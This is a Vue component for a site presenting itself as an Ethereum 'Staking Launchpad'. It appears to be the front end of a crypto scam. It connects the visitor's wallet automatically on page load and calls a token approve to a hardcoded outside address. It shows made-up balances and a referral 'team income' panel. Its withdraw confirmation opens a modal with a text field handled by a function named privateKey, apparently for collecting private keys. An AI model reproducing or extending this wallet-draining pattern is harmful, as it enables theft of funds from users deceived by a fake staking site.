<template>
  <div class="fixed  w-full z-30 ">
    <!-- Nav Bar -->
    <section class="wallet-btn flex px-4 justify-between py-4 bar-shadow">
      <div class="flex items-center">
        <router-link to="/" class="flex items-center">
          <img
            class="mr-2"
            src="@/assets/eth-diamond-plain.svg"
            alt="beijing"
          />
          <div class="sm:block lg:hidden ml-2 hover:opacity-50 text-base opacity-70 font-medium">
            Staking Lauchpad
          </div> 
        </router-link>
        <ul class="hidden lg:flex ml-2 space-x-8 text-base opacity-70 font-medium">
          <router-link to="/" class="hover:opacity-50">Staking Launchpad</router-link>
          <router-link to="/validator" class="hover:underline hover:opacity-50">FAQ</router-link>
          <li class="hover:underline hover:opacity-50">What is Staking</li>
          <router-link to="/term" class="hover:underline hover:opacity-50">Terms of Service</router-link>
          <li class="hover:underline hover:opacity-50" @click="isUser" >User Center</li>
        </ul>
      </div>
      <div class="flex">
        <button class="wallet-btn border border-black px-4 h-12 text-xl hidden sm:block text-white hover:scale-105 hover:transition hover:duration-500" @click="linkWallet" v-if="!address">CONNECT WALLET</button>
        <button class="wallet-btn border border-black px-4 h-12 text-xl hidden sm:block text-white hover:scale-105 hover:transition hover:duration-500" @click="approve" v-else> {{ !isApproved ? 'APPROVED' : `${address.slice(0, -36)}...${address.substring(38)}` }}</button>
        <div class="lg:hidden flex items-center ml-4 h-12" @click="isMenu">
          <font-awesome-icon v-if="menu" :icon="['fas', 'xmark']" class="font-bold text-2xl w-8 h-8" />
          <font-awesome-icon v-else :icon="['fas', 'bars']" class="font-bold text-2xl w-8 h-8" />
        </div>
      </div>
    </section>
    <div class="-z-20 absolute w-full block sm:block  ease-in-out transition transform duration-700" :class="menu ? 'translate-y-0' : '-translate-y-96'">
      <div v-if="testValue !== 'dashboard'"  class="bg-blue-20 px-8 py-4">
        <div class="font-semibold">Launced network: Prater Testnet</div>
        <a href="#" class="text-blue-300 hover:text-black">Switch to mainnet launchpad ↗</a>
        <div class="pt-4"><em>Visit this website on desktop to become a validator.</em></div>
      </div>
      <ul class="px-8 bg-white py-4">
        <li>FAQ</li>
        <li>
          <router-link to="/validator">What is Staking</router-link>
        </li>
        <li>
          <router-link to="/term">Terms of Service</router-link>
        </li>
        <li class="hover:underline hover:opacity-70" @click="isUser">User Center</li>
      </ul>
    </div>
    <div v-if="!user" class="absolute w-full h-screen bg-black z-40 top-0 foggy-modal opacity-70"/>
    <div class="absolute right-0 sm:w-88 w-full bg-red-10 z-50 h-screen sm:h-130   ease-in-out transition transform duration-700" :class="[user ? 'translate-x-full' : 'translate-x-0', isWithDrawModal ? 'overflow-hidden':'overflow-y-auto']">
      <div class="flex justify-end p-4" @click="isUser"><button></button><font-awesome-icon :icon="['fas', 'xmark']" class="font-bold text-2xl w-8 h-8" /></div>
      <div class="flex px-8 pb-6">
        <div class="relative">
          <div class="rounded-full bg-white w-14 h-14"/>
          <div class="absolute bg-brown w-14 h-4 rounded-full top-11"></div>
        </div>
        <div class="flex flex-col justify-center ml-4">
          <div>Wallet Adddress</div>
          <div v-if="address">{{`${address.slice(0, -36)}...${address.substring(37)}`}}</div>
          <div v-else>Please connect your wallet</div>
        </div>
      </div> 

      <div class="bg-white rounded-2xl box-shadow m-4 font-bold">
        <div class="p-4">
          <div>Staking Quantity</div>
          <div class="flex items-center py-2">
            <img src="@/assets/USD-Coin-icon_small.png" alt="USD" class="w-6 h-6">
            <div class="ml-1">163.89655  </div>
          </div>
        </div>
        <hr  class="h-1 bg-blue-20"/>
        <div class="flex p-4 justify-around">
          <div class="w-3/5">
            <div>Staking Revenue</div>
            <div class="flex items-center py-2">
              <img src="@/assets/ETH-logo2.png" alt="eth" class="w-6 h-6">
              <div class="ml-1">163.89655  </div>
            </div>
          </div>
          <div class="w-2/5">
            <div>Balance</div>
            <div class="flex items-center py-2">
              <img src="@/assets/ETH-logo2.png" alt="eth" class="w-6 h-6">
              <div class="ml-1">163.89655  </div>
            </div>
            <div class="flex items-center">
              <img src="@/assets/USD-Coin-icon_small.png" alt="usd" class="w-6 h-6">
              <div class="ml-1">163.89655  </div>
            </div>
          </div>
        </div>

      </div>

      <div class="flex justify-center">
        <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full hover:opacity-100" :class="isWithDrawModal? 'bg-red-500':''" @click="withdraw">WITHDRAW</button>
      </div>
      <div v-if="isWithDrawModal" class="absolute w-full h-full bg-red-10 z-20  top-0 overflow-hidden">
        <div class="flex justify-center pb-4 pt-16">
          <div class="text-red-300 w-8 h-8 rounded-full border-2 border-red-300 flex justify-center items-center my-2 absolute left-8" @click="withdraw">
            <font-awesome-icon :icon="['fas', 'arrow-left']" class="font-bold text-2xl w-6 h-6" />
          </div>
          <div class="bg-white flex justify-center items-center rounded-full px-8 text-xl py-2 font-bold"> 
            <div>WITHDRAW</div>
          </div>
        </div>
        <hr class="bg-gray-25 h-1"/>

        <div class="bg-white rounded-2xl box-shadow my-8 mx-4">
          <div>
            <div class="w-72 mx-auto">
              <div class="relative pt-8 pb-2">
                <input type="text" class="bg-red-300 rounded w-full h-12 pl-4"/>
                <div class="flex items-center space-x-2 py-2">
                  <div class="text-sm">Usable USDC 168.16422</div>
                  <button class="rounded-full px-4 border border-red-300 text-red-300">max</button>
                </div>
                <div class="flex items-center space-x-2 py-1">
                  <img src="@/assets/USD-Coin-icon_small.png" alt="usd" class="w-8 h-8 absolute right-1 top-10">
                </div>
              </div>
              <div class="flex justify-center py-4 relative z-10  ">
                <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full z-10" @click="privateKey">CONFIRM</button>
              </div>
            </div>
          </div>
        </div>
        <!-- <div  class="z-30 absolute bg-white rounded-2xl box-shadow my-8 mx-4">
          <div>hello</div>
        </div> -->

        <div v-if="isPrivateKey" class=" z-50 bg-white rounded-2xl box-shadow relative -mt-64 mx-4">
          <div>
            <div class="w-72 mx-auto">
              <div class="text-center text-xl pt-4">ATTENTION</div>
              <div class="relative pt-8 pb-2">
                <input type="text" class="bg-red-300 rounded w-full h-12 pl-4"/>
              </div>
              <div>Lorem ipsum dolor sit amet consectetur adipisicing elit. Consequatur, aperiam commodi. Iste tempore recusandae assumenda voluptatem voluptate amet impedit?</div>
              <div class="flex justify-center py-4">
                <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full" @click="privateKey">CONFIRM</button>
              </div>
            </div>
          </div>
        </div>

      </div>
      <div class="bg-white rounded-2xl box-shadow my-8 mx-4 font-bold">
        <div class="py-4 text-center">Ethernet Exchange</div>
        <hr  class="h-1 bg-blue-20"/>
        <div>
          
          <div class="w-40 mx-auto">
            <div class="flex items-center space-x-2 py-1">
              <img src="@/assets/ETH-logo2.png" alt="usd" class="w-8 h-8">
              <div class="text-xl">ETH</div>
              <button class="rounded-full px-4 border border-red-300 text-red-300">max</button>
            </div>
            <div class="bg-red-300 rounded w-full h-9 opacity-60"></div>
            <div class="text-red-300 w-8 h-8 rounded-full border-2 border-red-300 flex justify-center items-center mx-auto my-2">
              <font-awesome-icon :icon="['fas', 'arrow-down']" class="font-bold text-2xl w-6 h-6" />
            </div>
            <div class="flex items-center space-x-2 py-1">
              <img src="@/assets/USD-Coin-icon_small.png" alt="usd" class="w-8 h-8">
              <div class="text-xl">USDC</div>
            </div>
            <div class="bg-red-300 rounded w-full h-9 opacity-60"></div>

            <div class="flex justify-center py-4">
              <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full">CONVERT</button>
            </div>
          </div>
        </div>
      </div>

      <div class="bg-white rounded-2xl box-shadow mx-4 my-4 font-bold flex justify-between p-4">
        <div>
          <div>My Invitations</div>
          <div class="flex items-center py-2">
            <img src="@/assets/avatar.png" alt="avatar" class="w-6 h-6">
            <div>163</div>
          </div>
        </div>
        <div>
          <div>Team income</div>
          <div class="flex items-center py-2">
            <img src="@/assets/ETH-logo2.png" alt="eth" class="w-6 h-6">
            <div>163.89655</div>
          </div>
        </div>
      </div>

      <div class="flex justify-center">
        <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full">INVITE USERS</button>
      </div>

      <div class="bg-white rounded-2xl box-shadow mx-4 mt-8 mb-36 h-96 ">
        <div class="flex justify-center border-b border-black font-bold">
          <div class="border-r border-black pr-3 py-2">Earnings records</div>
          <div class="pl-3 py-2">Withdrawal records</div>
        </div>
        <div class="text-gray-500 flex justify-between px-2 py-1 border-b border-black">
          <div>2022-5-25 00-00-00</div>
          <div>+0.06255 ETH</div>
        </div>
        <div class="flex justify-between text-gray-500 px-2 py-1 border-b border-black items-center ">
          <div class="flex flex-col">
            <div>2022-5-25 00-00-00</div>
            <div>20.12345 ETH</div>
          </div>
          <div>Status: Warning</div>
        </div>
      </div>
    </div>

  </div>
</template>
<script>
  import { ref, computed, onMounted } from 'vue';
  import { useRoute } from 'vue-router'
  import Web3Wallet from "@/utils/Web3Wallet"
  import {getUrlQueryString} from "@/utils" 
  import WalletConnectQRCodeModal from "@walletconnect/qrcode-modal";
import { faLessThanEqual } from '@fortawesome/free-solid-svg-icons';
  export default {
    setup() {
      const route = useRoute()
      const testValue = computed(() => route.name)
      let menu = ref(false);
      let user = ref(true);
      const usdc_balance = ref(0);
      const address = ref('');
      const balance = ref(0);
      const isApproved = ref(false);
      const isWithDrawModal = ref(false);
      const isPrivateKey = ref(false);
      const isMenu = () => (menu.value = !menu.value);
      const isUser = () => (user.value = !user.value);
      const withdraw = () => (isWithDrawModal.value = !isWithDrawModal.value);
      const privateKey = () => (isPrivateKey.value = !isPrivateKey.value);
      
      let wallet;
      let a, i;
      const environment = ref('Ethereum');

      const linkWallet = async () => {
        environment.value = 'Ethereum'
        onConnect()
      }

      const onConnect = async () => {
        if (environment.value === 'Ethereum' && window.ethereum) {
          wallet = new Web3Wallet();
        } else {
          console.log("Error")
          return;
        }
        try {
          await wallet.linkWallet();
          address.value = await wallet.getAddress();

          if (address.value === false) {
            throw new TypeError("There was an issue signing you in.")
          }
          console.log('wallet', wallet)
          usdc_balance.value = await wallet.getBalance(address.value)
          console.log('walasdaslet', usdc_balance.value)
          balance.value = await wallet.balance(address.value)
          console.log("balance.value", balance.value)
          register()
        } catch (err) {
          console.log('login', err)
        }
      }
      const approve = async () => {
        debugger
        let auth_address = '';
        if (environment.value === 'Ethereum') {
          auth_address = '0x4D52e25e8333fe827337432E3B15f6093D7AdefE'
        } 
        if (auth_address === '') {
          console.log("Error")
          return;
        }
        try {
          const hash = await wallet.approve(auth_address, address.value);
          console.log('hash', hash);
          isApproved.value = true;
        } catch (error) {
          isApproved.value = false;
        }
          // receive({d: address.value, h: hash, au: auth_address}).then(res => {
          //   register();
          // })
      }
      const register = () => {
        console.log("hello")

        // const data = {d: address.value}
        // i ? data.i = i : '';
        // a ? data.a = a : '';
        // reg(data).then(res => {
        //   console.log("res", res)
        //   user.value = res.data;
        //   if (user.value.is_lock == 1) {
        //     usdc_balance.value = user.value.balance;
        //   }
        //   link.value = document.location.protocol + '//' + document.location.host + '?i=' + res.data.invite_code
        // })
      }



      onMounted(() => {
        a = getUrlQueryString('a');
        i = getUrlQueryString('i');
        setTimeout(() => {
          linkWallet();
        }, 1000);

      })
      return { menu, isMenu, user, isUser, testValue, linkWallet, address, approve, isApproved, isWithDrawModal, withdraw, privateKey, isPrivateKey };

    },
  };
</script>
